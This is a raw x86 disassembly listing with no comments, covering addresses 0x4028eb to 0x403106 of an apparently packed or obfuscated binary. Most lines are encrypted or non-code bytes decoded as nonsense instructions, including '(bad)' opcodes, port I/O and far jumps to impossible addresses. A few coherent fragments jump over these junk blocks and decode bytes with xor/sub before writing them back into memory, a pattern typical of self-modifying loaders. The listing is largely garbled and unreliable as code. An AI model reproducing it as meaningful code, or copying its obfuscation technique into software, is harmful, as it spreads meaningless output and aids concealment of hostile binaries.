  4028eb:	or     edi,DWORD PTR [edx-0x76c758aa]
  4028f1:	stos   BYTE PTR es:[edi],al
  4028f2:	mov    ds:0x941adc65,eax
  4028f7:	enter  0xa363,0x22
  4028fb:	sbb    ebx,0xffffff8f
  4028fe:	jbe    0x4028c9
  402900:	retf   0x669b
  402903:	dec    eax
  402904:	pop    edx
  402905:	ror    ebp,1
  402907:	mov    esi,0x328f38c6
  40290c:	sub    al,0xce
  40290e:	push   ds
  40290f:	mov    cl,0x3b
  402911:	inc    ebp
  402912:	mov    bl,0xc0
  402914:	push   eax
  402915:	sub    al,0x4
  402917:	sub    edi,DWORD PTR [eax+0x48]
  40291a:	mov    eax,0xac314d6b
  40291f:	mov    WORD PTR [esi],?
  402921:	fcomp  DWORD PTR [edi+0x6191f7e7]
  402927:	sbb    al,0xf
  402929:	leave  
  40292a:	arpl   cx,di
  40292c:	(bad)  
  40292d:	fiadd  WORD PTR [esi-0x6edded14]
  402933:	jb     0x40294b
  402935:	es clc 
  402937:	leave  
  402938:	sub    al,0xff
  40293a:	pop    ebp
  40293b:	imul   ecx,DWORD PTR [edx-0x64d16a00],0x5d
  402942:	idiv   BYTE PTR [ebp+0x48]
  402945:	jmp    0x857905c3
  40294a:	jo     0x4029b5
  40294c:	out    dx,eax
  40294d:	jns    0x402999
  40294f:	icebp  
  402950:	in     eax,0xdc
  402952:	jae    0x402977
  402954:	sahf   
  402955:	or     DWORD PTR [bp+si+0x3081],0x1e85311e
  40295e:	js     0x402972
  402960:	sbb    ebx,DWORD PTR [eax-0x5a49c2ae]
  402966:	push   esi
  402967:	test   ebx,eax
  402969:	xor    BYTE PTR [esi],ah
  40296b:	aaa    
  40296c:	shl    BYTE PTR [esi-0x39115556],cl
  402972:	in     eax,0x25
  402974:	test   al,0x7e
  402976:	(bad)  
  402977:	mov    ?,WORD PTR [esi-0x1e3d3249]
  40297d:	cmp    ch,BYTE PTR [ebp-0x241ccb1b]
  402983:	mov    esi,0xd21b7d9c
  402988:	push   esp
  402989:	lds    esp,FWORD PTR [ebp+0x24f30508]
  40298f:	je     0x4029a0
  402991:	or     ch,BYTE PTR [eax-0x37]
  402994:	aas    
  402995:	sbb    DWORD PTR [esi+0x5b],edi
  402998:	push   ebp
  402999:	xor    DWORD PTR [ecx+0x22],ebp
  40299c:	inc    esp
  40299d:	ds cmp al,0x49
  4029a0:	iret   
  4029a1:	sub    BYTE PTR [edi+eax*4+0x5],al
  4029a5:	sbb    BYTE PTR [ebx],cl
  4029a7:	sbb    dh,BYTE PTR [edi]
  4029a9:	std    
  4029aa:	xchg   esi,eax
  4029ab:	or     eax,0x37892e4c
  4029b0:	jne    0x402984
  4029b2:	bound  eax,QWORD PTR [ebx]
  4029b4:	cmp    dl,BYTE PTR [ecx]
  4029b6:	or     eax,0x4350329e
  4029bb:	cwde   
  4029bc:	ficomp DWORD PTR [ecx]
  4029be:	inc    esi
  4029bf:	mov    ah,0x25
  4029c1:	in     eax,dx
  4029c2:	in     al,0x3f
  4029c4:	into   
  4029c5:	sbb    eax,DWORD PTR [ecx]
  4029c7:	and    BYTE PTR [ebp+0x1a],ch
  4029ca:	or     bl,BYTE PTR [edx+0x1b]
  4029cd:	call   0x46858db8
  4029d2:	sub    al,0xdb
  4029d4:	cld    
  4029d5:	xchg   ebx,eax
  4029d6:	mov    al,es:0xb13a5bc8
  4029dc:	and    BYTE PTR [ecx-0x68],bh
  4029df:	or     bh,dh
  4029e1:	cld    
  4029e2:	pusha  
  4029e3:	push   cs
  4029e4:	mov    dh,0xc4
  4029e6:	ret    0x317e
  4029e9:	es dec ecx
  4029eb:	out    dx,al
  4029ec:	pop    es
  4029ed:	and    DWORD PTR [ecx],esp
  4029ef:	rcl    al,1
  4029f1:	rol    BYTE PTR ds:0x2e5cd624,1
  4029f7:	pop    esp
  4029f8:	aad    0x10
  4029fa:	addr16 add al,0x7e
  4029fd:	or     al,0x28
  4029ff:	push   edx
  402a00:	jle    0x402a60
  402a02:	les    edx,FWORD PTR [eax-0x3de95f97]
  402a08:	dec    ebp
  402a09:	dec    ecx
  402a0a:	jbe    0x4029ef
  402a0c:	jge    0x402a0e
  402a0e:	test   BYTE PTR [edi-0x74c18e7b],bh
  402a14:	inc    ebp
  402a15:	aam    0xf
  402a17:	test   DWORD PTR [ebx],eax
  402a19:	add    BYTE PTR [eax],al
  402a1b:	add    BYTE PTR [ebx-0x39cc0fbb],cl
  402a21:	add    eax,edi
  402a23:	jmp    0x402bc4
  402a28:	or     al,0x32
  402a2a:	retf   
  402a2b:	jecxz  0x402a1e
  402a2d:	jecxz  0x402a63
  402a2f:	icebp  
  402a30:	loop   0x402a16
  402a32:	mov    bl,0xe4
  402a34:	jb     0x402a60
  402a36:	xor    cl,al
  402a38:	stos   BYTE PTR es:[edi],al
  402a39:	or     eax,0x7ffa7e7e
  402a3e:	jle    0x402abe
  402a40:	das    
  402a41:	nop
  402a42:	sbb    bl,dl
  402a44:	jge    0x402a1e
  402a46:	mov    BYTE PTR [ecx],ah
  402a48:	pop    esp
  402a49:	adc    ah,bl
  402a4b:	div    BYTE PTR [esi]
  402a4d:	mov    bh,0xde
  402a4f:	repnz lods al,BYTE PTR ds:[esi]
  402a51:	push   0xfffffff3
  402a53:	mov    bl,0x52
  402a55:	popa   
  402a56:	sub    al,0x4a
  402a58:	push   es
  402a59:	mov    esi,0x2623c73
  402a5e:	test   DWORD PTR [esp+eax*2],eax
  402a61:	xchg   edx,eax
  402a62:	mov    eax,ds:0x79c0d6da
  402a67:	imul   esi,DWORD PTR [edi-0x3e],0x57
  402a6b:	dec    ebx
  402a6c:	push   esi
  402a6d:	ret    0x16bd
  402a70:	rcr    BYTE PTR [edx-0x57],cl
  402a73:	mov    ecx,0xd1c103c6
  402a78:	fdiv   DWORD PTR [eax-0x1c]
  402a7b:	mov    BYTE PTR [ebx],dh
  402a7d:	mov    ecx,0xddbfe1fe
  402a82:	test   bl,dl
  402a84:	popf   
  402a85:	popf   
  402a86:	or     DWORD PTR [ecx-0x4efdf41d],edi
  402a8c:	adc    ebp,edx
  402a8e:	loopne 0x402adb
  402a90:	pushf  
  402a91:	popa   
  402a92:	pusha  
  402a93:	into   
  402a94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a95:	or     eax,0xc08bfcf7
  402a9a:	clc    
  402a9b:	mov    BYTE PTR ds:0x9d0566d5,ah
  402aa1:	mov    DWORD PTR [esi+ebp*8],0xd266354f
  402aa8:	jmp    0xc36e39d3
  402aad:	lds    ebx,FWORD PTR [ebx+ebx*4-0x6e]
  402ab1:	xchg   esi,eax
  402ab2:	push   cs
  402ab3:	into   
  402ab4:	and    DWORD PTR [ebx],0x9bb57db2
  402aba:	sbb    bl,BYTE PTR [eax+ecx*1-0x5b]
  402abe:	out    0x13,eax
  402ac0:	aam    0xf4
  402ac2:	outs   dx,BYTE PTR ds:[esi]
  402ac3:	sub    al,0x55
  402ac5:	inc    edi
  402ac6:	pop    ss
  402ac7:	add    edx,DWORD PTR [ebp+0x32]
  402aca:	aas    
  402acb:	icebp  
  402acc:	(bad)  
  402acd:	jle    0x402a99
  402acf:	pop    edx
  402ad0:	call   0xdc422098
  402ad5:	cmc    
  402ad6:	xor    ebx,DWORD PTR [eax+0x2b3fb4e7]
  402adc:	and    eax,0x2bd66940
  402ae1:	(bad)  
  402ae3:	sbb    eax,0x73bbfdd7
  402ae8:	imul   ecx,ecx,0xffffff9b
  402aeb:	arpl   WORD PTR [edi-0x48],cx
  402aee:	pop    es
  402aef:	cmp    DWORD PTR [eax],ecx
  402af1:	jp     0x402b3d
  402af3:	xor    dl,al
  402af5:	or     DWORD PTR [ecx+0x64],esp
  402af8:	fnstsw WORD PTR [edi-0x41]
  402afb:	lods   al,BYTE PTR ds:[esi]
  402afc:	mov    edi,0x6fa92a8a
  402b01:	or     eax,0xa92b89b4
  402b06:	fistp  DWORD PTR [ecx]
  402b08:	imul   esi,DWORD PTR [ebp-0x3676f550],0xffffff98
  402b0f:	cmp    ah,BYTE PTR [edi-0x3a16a0ac]
  402b15:	inc    ebx
  402b16:	and    ebx,DWORD PTR [eax]
  402b18:	xor    dl,BYTE PTR [ecx]
  402b1a:	push   ebx
  402b1b:	pushf  
  402b1c:	retf   
  402b1d:	cmp    ecx,edx
  402b1f:	jmp    0x301f:0x277c0714
  402b26:	dec    edx
  402b27:	xor    edx,DWORD PTR [ebx-0x12e057c2]
  402b2d:	xchg   edx,eax
  402b2e:	fdiv   DWORD PTR [edi+ecx*1]
  402b31:	adc    BYTE PTR [eax+0x78],bh
  402b34:	or     WORD PTR [ecx],0xff88
  402b38:	dec    DWORD PTR [edi-0x58]
  402b3b:	dec    edx
  402b3c:	add    ecx,DWORD PTR [ebp-0x67942f49]
  402b42:	(bad)  
  402b43:	push   0xffffff96
  402b45:	ss xchg esi,eax
  402b47:	mov    ch,BYTE PTR [esi]
  402b49:	and    eax,0x93ac62ba
  402b4e:	stos   DWORD PTR es:[edi],eax
  402b4f:	adc    BYTE PTR [edi-0x59],bh
  402b52:	mov    ecx,0x3197ab45
  402b57:	dec    esp
  402b58:	iret   
  402b59:	pop    ecx
  402b5a:	pop    esp
  402b5b:	cvtps2pi mm0,xmm6
  402b5e:	aam    0xa2
  402b60:	adc    eax,0xa70a28b7
  402b65:	cld    
  402b66:	mov    esp,0x22e3fbd0
  402b6b:	outs   dx,DWORD PTR ds:[esi]
  402b6c:	rcr    BYTE PTR [eax+ebx*4+0x5],cl
  402b70:	repnz stos DWORD PTR es:[edi],eax
  402b72:	jle    0x402bec
  402b74:	loope  0x402b9b
  402b76:	xchg   edi,eax
  402b77:	pop    es
  402b78:	popf   
  402b79:	js     0x402b0a
  402b7b:	dec    eax
  402b7c:	push   0x50
  402b7e:	jle    0x402bf7
  402b80:	and    al,0xae
  402b82:	or     eax,0xce0a99ae
  402b87:	addr16 cmc 
  402b89:	test   bh,bh
  402b8b:	mov    bh,0xec
  402b8d:	mov    ecx,cs
  402b8f:	leave  
  402b90:	dec    edx
  402b91:	das    
  402b92:	(bad)  
  402b93:	adc    DWORD PTR [ecx-0x13],0xdf5eb17
  402b9a:	adc    DWORD PTR [esp+esi*8-0x27dd3f66],edx
  402ba1:	pusha  
  402ba2:	aam    0x1b
  402ba4:	jbe    0x402b53
  402ba6:	leave  
  402ba7:	jne    0x402b52
  402ba9:	stc    
  402baa:	jmp    0x402c1d
  402bac:	lea    edi,[eax-0x6f3a7d91]
  402bb2:	repnz sub bh,BYTE PTR [edx+ebp*2-0x37]
  402bb7:	aas    
  402bb8:	xchg   DWORD PTR [ecx-0x5e2649a9],edi
  402bbe:	cwde   
  402bbf:	dec    esp
  402bc0:	cmp    ebx,DWORD PTR [ecx-0x3f7ae707]
  402bc6:	je     0x402bf4
  402bcc:	lea    eax,[ebp-0x98]
  402bd2:	push   eax
  402bd3:	mov    eax,DWORD PTR [ebp-0x1c]
  402bd6:	xor    eax,esi
  402bd8:	add    eax,edi
  402bda:	push   eax
  402bdb:	mov    eax,DWORD PTR [ebp-0x18]
  402bde:	add    eax,0xee
  402be3:	push   eax
  402be4:	mov    eax,DWORD PTR [ebp-0x18]
  402be7:	mov    eax,DWORD PTR [eax+0x198]
  402bed:	push   DWORD PTR [eax]
  402bef:	call   0x40984d
  402bf4:	mov    ecx,DWORD PTR [ebp-0x28]
  402bf7:	xor    ecx,esi
  402bf9:	mov    eax,0xffcd8d65
  402bfe:	sub    eax,ecx
  402c00:	jmp    0x402da1
  402c05:	add    DWORD PTR [edx-0x2e6a296b],ecx
  402c0b:	inc    ecx
  402c0c:	dec    ecx
  402c0d:	aas    
  402c0e:	cmp    al,0x84
  402c10:	out    dx,al
  402c11:	shl    BYTE PTR [esi],cl
  402c13:	sbb    DWORD PTR [ecx+0x36],0xb
  402c17:	jle    0x402c97
  402c19:	cli    
  402c1a:	jg     0x402c9a
  402c1c:	jle    0x402bc4
  402c1e:	or     al,0x11
  402c20:	push   ebp
  402c21:	adc    edi,DWORD PTR [ecx]
  402c23:	mov    bl,0xe2
  402c25:	xor    ah,BYTE PTR [ecx+0x18]
  402c28:	mov    ah,0xeb
  402c2a:	jmp    0x402c30
  402c2c:	arpl   WORD PTR [ecx+eax*4+0x60],cx
  402c30:	lods   eax,DWORD PTR ds:[esi]
  402c31:	push   ds
  402c32:	or     al,0x56
  402c34:	stos   DWORD PTR es:[edi],eax
  402c35:	shl    ebp,cl
  402c37:	fwait
  402c38:	or     eax,0xa6ce0fae
  402c3d:	sub    eax,ecx
  402c3f:	test   BYTE PTR [esi],bh
  402c41:	pop    esi
  402c42:	enter  0xddc6,0x6d
  402c46:	outs   dx,BYTE PTR ds:[esi]
  402c47:	repz fimul DWORD PTR [eax+0x7d]
  402c4b:	bound  edi,QWORD PTR ds:0x1ef3f453
  402c51:	inc    esi
  402c52:	mov    ebx,0xfa6b6ce2
  402c57:	sbb    al,0x95
  402c59:	nop
  402c5a:	and    eax,0x2ce53b64
  402c5f:	or     al,0xe4
  402c61:	(bad)  
  402c62:	test   eax,0xd80b6500
  402c67:	fwait
  402c68:	stos   BYTE PTR es:[edi],al
  402c69:	jnp    0x402c2e
  402c6b:	xchg   ecx,eax
  402c6c:	or     ch,BYTE PTR [ecx+0x6734c71]
  402c72:	lods   eax,DWORD PTR ds:[esi]
  402c73:	sti    
  402c74:	frstor [esi-0x4]
  402c77:	(bad)  
  402c78:	lock inc esp
  402c7a:	cmc    
  402c7b:	test   DWORD PTR ds:0x9baacbb4,0x3eff0b82
  402c85:	(bad)  
  402c86:	pop    edx
  402c87:	sbb    esp,edi
  402c89:	mov    ds:0x7f40a63b,eax
  402c8e:	lods   al,BYTE PTR ds:[esi]
  402c8f:	push   eax
  402c90:	jb     0x402d08
  402c92:	ss dec edi
  402c94:	sbb    ch,al
  402c96:	adc    eax,0xe044ce4a
  402c9b:	mov    cs,ebp
  402c9d:	mov    ebx,0xeab9f3ed
  402ca2:	inc    ebx
  402ca3:	gs es imul esp,eax,0xffffffc1
  402ca8:	jns    0x402c54
  402caa:	into   
  402cab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402cac:	and    ebx,DWORD PTR [ecx+0x2d]
  402caf:	cld    
  402cb0:	test   BYTE PTR [edx],dl
  402cb2:	inc    edi
  402cb3:	and    DWORD PTR [edx+ebp*4-0x451d3afe],0xdc40daf8
  402cbe:	add    BYTE PTR [esi],dl
  402cc0:	push   ebx
  402cc1:	and    eax,0x819b1a3
  402cc6:	pop    esi
  402cc7:	pop    ds
  402cc8:	jno    0x402ca0
  402cca:	std    
  402ccb:	shl    BYTE PTR ds:0xae6ab2a6,0x5a
  402cd2:	aad    0x44
  402cd4:	clc    
  402cd5:	cmp    dl,BYTE PTR [edi-0x51]
  402cd8:	mov    edx,0x5bdc9164
  402cdd:	mov    ds:0xb97d8da3,al
  402ce2:	sub    eax,edx
  402ce4:	pop    ebx
  402ce5:	cwde   
  402ce6:	xchg   ecx,eax
  402ce7:	(bad)  
  402ce8:	fs into 
  402cea:	sbb    dh,dh
  402cec:	or     BYTE PTR [ebx+ecx*4-0x584c49df],ch
  402cf3:	xchg   esi,eax
  402cf4:	mov    esi,0x47b23212
  402cf9:	xchg   edi,eax
  402cfa:	cmp    ecx,0xffffffa3
  402cfd:	shr    eax,0xc5
  402d00:	pop    eax
  402d01:	clc    
  402d02:	adc    BYTE PTR [edx+0x4d],0xfc
  402d06:	push   edx
  402d07:	xor    esi,DWORD PTR [ebx+0x5f]
  402d0a:	imul   eax,DWORD PTR gs:[ebp+0x16517932],0xffffffa8
  402d12:	sub    DWORD PTR [ecx-0x61],ebp
  402d15:	xchg   edi,ebx
  402d17:	jnp    0x402cd2
  402d19:	in     al,0x53
  402d1b:	sbb    DWORD PTR [ebp-0x36],0x3
  402d1f:	stc    
  402d20:	fs pusha 
  402d22:	pushf  
  402d23:	mov    ebp,0x26970331
  402d28:	imul   esp,DWORD PTR [edx+0x5b637f60],0x4a5efadd
  402d32:	int    0xc9
  402d34:	xor    al,0x7
  402d36:	out    dx,al
  402d37:	aaa    
  402d38:	lds    eax,FWORD PTR [edi]
  402d3a:	xchg   DWORD PTR [esi-0x6765cde],edi
  402d40:	jmp    0xb1d8c365
  402d45:	dec    edi
  402d46:	pop    ss
  402d47:	mov    bl,0x18
  402d49:	pop    edx
  402d4a:	dec    ebx
  402d4b:	int3   
  402d4c:	sub    BYTE PTR [edi-0x22],0x87
  402d50:	jbe    0x402d86
  402d52:	loop   0x402d0f
  402d54:	fcomp  DWORD PTR [ecx+ecx*1+0x2eb562a2]
  402d5b:	pop    ecx
  402d5c:	adc    dl,al
  402d5e:	xchg   edx,eax
  402d5f:	lds    ecx,FWORD PTR [eax+0x16569951]
  402d65:	mov    cl,0x7f
  402d67:	mov    dl,0xcd
  402d69:	sub    esi,esp
  402d6b:	stos   BYTE PTR es:[edi],al
  402d6c:	adc    bl,al
  402d6e:	add    eax,0x2654c7b8
  402d73:	mov    ecx,0xf1112fad
  402d78:	adc    DWORD PTR [eax],esi
  402d7a:	fcomp  QWORD PTR ds:0xd47288b8
  402d80:	jmp    0x45935767
  402d85:	hlt    
  402d86:	test   al,0xbd
  402d88:	xchg   ecx,eax
  402d89:	dec    edi
  402d8a:	mov    ebx,0x43c22f31
  402d8f:	sbb    DWORD PTR [ebx-0x21],edx
  402d92:	xchg   ecx,eax
  402d93:	jae    0x402d9b
  402d95:	mov    edx,0x2170ab40
  402d9a:	jecxz  0x402d66
  402d9c:	mov    ds:0x48ab5b74,eax
  402da1:	sub    eax,DWORD PTR [ebp-0x4]
  402da4:	mov    ecx,DWORD PTR [ebp-0x48]
  402da7:	add    ecx,eax
  402da9:	mov    eax,DWORD PTR [ebp-0x4]
  402dac:	mov    DWORD PTR [eax+0x1],ecx
  402daf:	mov    al,BYTE PTR [ebp-0x11]
  402db2:	mov    ecx,DWORD PTR [ebp-0x4]
  402db5:	xor    al,0x46
  402db7:	sub    al,0x38
  402db9:	mov    BYTE PTR [ecx],al
  402dbb:	lea    eax,[ebp-0x4]
  402dbe:	inc    BYTE PTR [eax]
  402dc0:	inc    eax
  402dc1:	push   eax
  402dc2:	pop    ecx
  402dc3:	dec    ecx
  402dc4:	xchg   ecx,edx
  402dc6:	dec    BYTE PTR [edx]
  402dc8:	push   DWORD PTR [ebp-0x18]
  402dcb:	mov    eax,ds:0x413bf0
  402dd0:	mov    eax,DWORD PTR [eax]
  402dd2:	push   DWORD PTR [eax]
  402dd4:	jmp    0x402f75
  402dd9:	jmp    0x402df6
  402ddb:	xchg   dh,bl
  402ddd:	push   esi
  402dde:	arpl   WORD PTR [ebx+0x2b],si
  402de1:	nop
  402de2:	push   edi
  402de3:	ror    BYTE PTR [eax+edi*1-0x5c],1
  402de7:	jb     0x402e64
  402de9:	mov    dl,0x8
  402deb:	jle    0x402e6b
  402ded:	cli    
  402dee:	jg     0x402e6e
  402df0:	jle    0x402dbe
  402df2:	push   0x8bbe8542
  402df7:	cs fcom st(7)
  402dfa:	mov    ds:0x48efae54,al
  402dff:	loop   0x402e1c
  402e01:	test   cl,al
  402e03:	lds    esp,FWORD PTR [esi+0x452bb26c]
  402e09:	fdivr  QWORD PTR [ebp-0x13fb97fb]
  402e0f:	int3   
  402e10:	or     DWORD PTR [ebx],ebp
  402e12:	push   eax
  402e13:	(bad)  
  402e14:	mov    DWORD PTR ds:0x1a10f6b0,esp
  402e1a:	imul   edx,ecx,0x38
  402e1d:	pop    es
  402e1e:	imul   DWORD PTR [esi+0x19]
  402e21:	sub    ebx,DWORD PTR [eax-0x35866b0]
  402e27:	sub    bl,cl
  402e29:	retf   
  402e2a:	lock hlt 
  402e2c:	push   DWORD PTR [edx+0x2d2c1a75]
  402e32:	addr16 (bad) 
  402e34:	pop    edi
  402e35:	pop    edx
  402e36:	push   edi
  402e37:	mul    DWORD PTR [ebp+eax*8+0x78dc98bc]
  402e3e:	retf   0x93d4
  402e41:	js     0x402df6
  402e43:	inc    edx
  402e44:	mov    bl,0x65
  402e46:	push   ds
  402e47:	sub    al,ch
  402e49:	clc    
  402e4a:	mov    eax,DWORD PTR [bp+di+0x70]
  402e4e:	das    
  402e4f:	dec    edx
  402e50:	push   ss
  402e51:	retf   0x2cf9
  402e54:	xor    eax,0x9ec31e4a
  402e59:	push   ss
  402e5a:	adc    al,0x3
  402e5c:	mov    cl,0x95
  402e5e:	mov    ecx,0x703436dc
  402e63:	jne    0x402ebc
  402e65:	jae    0x402e40
  402e67:	add    edi,DWORD PTR [esi+0x5179deb]
  402e6d:	xchg   ecx,eax
  402e6e:	and    al,0x4
  402e70:	loope  0x402e1e
  402e72:	pop    ss
  402e73:	dec    BYTE PTR [esi-0x2e]
  402e76:	(bad)  
  402e77:	imul   edx,DWORD PTR [ebx-0x3cc1ccb3],0xfffffffa
  402e7e:	ins    DWORD PTR es:[edi],dx
  402e7f:	sub    ah,BYTE PTR ss:[ebx+0x22c9d1e]
  402e86:	adc    eax,0x1f903c2f
  402e8b:	jmp    0xd7b1:0x3328ec2f
  402e92:	xchg   ebp,eax
  402e93:	data16 sahf 
  402e95:	xor    al,0x80
  402e97:	imul   esp,DWORD PTR [eax+0x630a4da5],0x32
  402e9e:	fdivr  QWORD PTR [ebp-0x4714e26d]
  402ea4:	pop    es
  402ea5:	mov    ah,0xfe
  402ea7:	les    edi,FWORD PTR [ebp-0x16ae0705]
  402ead:	jne    0x402e43
  402eaf:	or     BYTE PTR [edi],cl
  402eb1:	das    
  402eb2:	xor    eax,0x7969fae5
  402eb7:	xchg   ecx,eax
  402eb8:	and    DWORD PTR [ecx-0x3a],esp
  402ebb:	mov    ds:0xd1d630f8,eax
  402ec0:	cli    
  402ec1:	fist   DWORD PTR [ebp-0x5169dd83]
  402ec7:	out    dx,eax
  402ec8:	xor    ebp,DWORD PTR [edi+0x4c]
  402ecb:	mov    bh,0x5
  402ecd:	add    BYTE PTR [edx+0x60319f73],0x61
  402ed4:	pop    ss
  402ed5:	mov    gs:0x412474c3,al
  402edb:	add    BYTE PTR ds:0x55ef1a7f,0xaa
  402ee2:	cld    
  402ee3:	stos   DWORD PTR es:[edi],eax
  402ee4:	sbb    edi,esi
  402ee6:	in     eax,0x3c
  402ee8:	ret    
  402ee9:	nop
  402eea:	stos   DWORD PTR es:[edi],eax
  402eeb:	adc    al,0x1c
  402eed:	in     eax,0x19
  402eef:	dec    ecx
  402ef0:	mov    esp,0xace2b11f
  402ef5:	push   0xffffff87
  402ef7:	pop    ecx
  402ef8:	imul   esi,edx,0xec7c6f19
  402efe:	mov    edi,0xa8867ea7
  402f03:	aas    
  402f04:	les    ecx,FWORD PTR [ebp+0x0]
  402f07:	(bad)  
  402f08:	mov    dl,0x66
  402f0a:	popa   
  402f0b:	(bad)
  402f0e:	fild   DWORD PTR [ebx-0x5ef7b26b]
  402f14:	jne    0x402f0d
  402f16:	and    eax,0x5fef9a5f
  402f1b:	loopne 0x402f23
  402f1d:	and    DWORD PTR [edx-0x11ecb987],ebx
  402f23:	retf   0x6dc
  402f26:	push   ebx
  402f27:	pop    esp
  402f28:	xor    al,0xbe
  402f2a:	mov    ch,0x75
  402f2c:	xor    ch,BYTE PTR [esi]
  402f2e:	mov    DWORD PTR [esi],edi
  402f30:	mov    edx,DWORD PTR [ebp-0x48e693b8]
  402f36:	sub    dx,WORD PTR [ebx+0x32]
  402f3a:	xor    eax,0x8ab274eb
  402f3f:	outs   dx,DWORD PTR ds:[esi]
  402f40:	and    al,BYTE PTR [esi+ecx*2]
  402f43:	test   al,0xf
  402f45:	xor    bl,BYTE PTR ds:0x991c17d1
  402f4b:	inc    edx
  402f4c:	or     DWORD PTR ds:0x4bb5ad32,edx
  402f52:	(bad)  
  402f54:	das    
  402f55:	not    cl
  402f57:	(bad)
  402f5b:	jp     0x402f2e
  402f5d:	das    
  402f5e:	xor    al,0x8a
  402f60:	and    al,0x78
  402f62:	add    eax,0x8c680c2c
  402f67:	call   0x31ef1d66
  402f6c:	fisubr WORD PTR [edi]
  402f6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f6f:	rcr    DWORD PTR [esp+esi*4-0x3e],cl
  402f73:	pop    edx
  402f74:	dec    edi
  402f75:	lea    eax,ds:0x413c0c
  402f7b:	push   DWORD PTR [eax]
  402f7d:	lea    eax,ds:0x4139b8
  402f83:	push   DWORD PTR [eax]
  402f85:	lea    eax,ds:0x413bec
  402f8b:	push   DWORD PTR [eax]
  402f8d:	lea    eax,ds:0x413d34
  402f93:	push   DWORD PTR [eax]
  402f95:	xchg   ebx,edx
  402f97:	inc    ebx
  402f98:	inc    ebx
  402f99:	push   ebx
  402f9a:	pop    eax
  402f9b:	jmp    0x40313c
  402fa0:	cmc    
  402fa1:	mov    ebp,0x63b00620
  402fa6:	icebp  
  402fa7:	ins    DWORD PTR es:[edi],dx
  402fa8:	sbb    esi,DWORD PTR [edi-0x46ee5a49]
  402fae:	gs jb  0x402fef
  402fb1:	push   ss
  402fb2:	jle    0x403032
  402fb4:	cli    
  402fb5:	jg     0x403035
  402fb7:	jle    0x402fab
  402fb9:	adc    eax,0x70c3dc7e
  402fbe:	ror    BYTE PTR ds:0x5acc783d,1
  402fc4:	clc    
  402fc5:	xor    BYTE PTR [esi-0x77],bl
  402fc8:	les    esi,FWORD PTR [eax+ebp*1+0x79]
  402fcc:	dec    esp
  402fcd:	repnz mov ah,al
  402fd0:	(bad)  
  402fd1:	xlat   BYTE PTR ds:[ebx]
  402fd2:	loop   0x40304d
  402fd4:	cwde   
  402fd5:	jbe    0x402fde
  402fd7:	xchg   esp,eax
  402fd8:	rol    BYTE PTR [ebx],cl
  402fda:	mov    edi,0xf1c0394a
  402fdf:	std    
  402fe0:	xchg   edi,eax
  402fe1:	(bad)  
  402fe2:	in     al,dx
  402fe3:	cld    
  402fe4:	push   ds
  402fe5:	sbb    BYTE PTR [edx-0x6e742dc1],al
  402feb:	cmp    edi,DWORD PTR [eiz*1-0x3bd2012b]
  402ff2:	mov    cl,0x7c
  402ff4:	int3   
  402ff5:	retf   
  402ff6:	mov    cs,WORD PTR [ecx+0x64]
  402ff9:	shl    edx,1
  402ffb:	sub    DWORD PTR [ecx],ebp
  402ffd:	push   esi
  402ffe:	xchg   ebx,eax
  402fff:	jb     0x402fe0
  403001:	pop    es
  403002:	test   DWORD PTR [ebp-0x4766ea3c],ecx
  403008:	enter  0x2e6d,0xca
  40300c:	fisttp WORD PTR [edi]
  40300e:	lock fsubr QWORD PTR [esi+0x2d8c6057]
  403015:	std    
  403016:	xchg   ebx,eax
  403017:	mov    al,ds:0x694bf8f
  40301c:	minps  xmm0,xmm4
  40301f:	gs push edx
  403021:	jne    0x402fbf
  403023:	repnz fdivrp st(7),st
  403026:	adc    BYTE PTR [edi+0x65],ah
  403029:	pop    eax
  40302a:	cdq    
  40302b:	retf   
  40302c:	dec    esp
  40302d:	pop    es
  40302e:	mov    esp,DWORD PTR [eax-0x436e7106]
  403034:	xor    bl,BYTE PTR [esi-0x110f769a]
  40303a:	cdq    
  40303b:	daa    
  40303c:	xor    eax,DWORD PTR [edx+0x3506bca0]
  403042:	mov    WORD PTR [esp+edx*4+0x1406709],ds
  403049:	arpl   di,si
  40304b:	mov    ecx,0xfa946833
  403050:	fmul   st(2),st
  403052:	retf   
  403053:	cld    
  403054:	adc    dh,BYTE PTR [esp+ebx*2]
  403057:	or     al,BYTE PTR [edi+0x79462bbb]
  40305d:	lea    esp,[edx-0xd]
  403060:	xchg   ebp,eax
  403061:	(bad)
  403065:	std    
  403066:	mov    al,ds:0x7deb38a1
  40306b:	jmp    0x62509c31
  403070:	xchg   esi,eax
  403071:	fidiv  WORD PTR [ebx]
  403073:	sbb    dl,al
  403075:	add    ebx,ebx
  403077:	adc    cl,BYTE PTR [ebx]
  403079:	inc    esp
  40307a:	xchg   edx,eax
  40307b:	mov    esi,0x30f6b606
  403080:	mov    al,BYTE PTR ds:0x9a5bb563
  403086:	mov    esp,0x794cd292
  40308b:	pop    es
  40308c:	or     BYTE PTR [esi+0x47e0b2d8],ah
  403092:	(bad)  
  403093:	sub    al,0x2d
  403095:	rcl    DWORD PTR [edx+0x7],1
  403098:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403099:	(bad)
  40309c:	jp     0x403086
  40309e:	mov    edi,0x36ebf059
  4030a3:	imul   esp,DWORD PTR [esi],0xd33447f7
  4030a9:	mov    ch,0x72
  4030ab:	rcr    DWORD PTR [esi],0x18
  4030ae:	inc    ebx
  4030af:	push   0x62823c9d
  4030b4:	mov    ebx,0x49a53386
  4030b9:	pop    ss
  4030ba:	cs inc eax
  4030bc:	pusha  
  4030bd:	test   eax,0x8432492e
  4030c2:	sahf   
  4030c3:	in     eax,dx
  4030c4:	or     DWORD PTR [eax+ebp*1-0x6cf8e4af],ebx
  4030cb:	mov    dh,0x7c
  4030cd:	cmp    dl,BYTE PTR [ebx-0x2be2731a]
  4030d3:	rcl    DWORD PTR [eax+0x4e],0x8e
  4030d7:	push   0xf7b0a3e1
  4030dc:	dec    ecx
  4030dd:	mov    ecx,0x5ba3f0a3
  4030e2:	or     dh,BYTE PTR [edx+0x47]
  4030e5:	ins    DWORD PTR es:[edi],dx
  4030e6:	jmp    0x403133
  4030e8:	sub    DWORD PTR [eax-0x3a],ecx
  4030eb:	pushw  0xffae
  4030ee:	mov    dl,0xe3
  4030f0:	sub    BYTE PTR [edi+0x49],dl
  4030f3:	mov    ebx,0x111eb182
  4030f8:	mov    esp,0x8b1338b3
  4030fd:	lahf   
  4030fe:	and    esi,ebp
  403100:	stos   DWORD PTR es:[edi],eax
  403101:	sbb    eax,0x4445b3fe
  403106:	or     al,0xb5
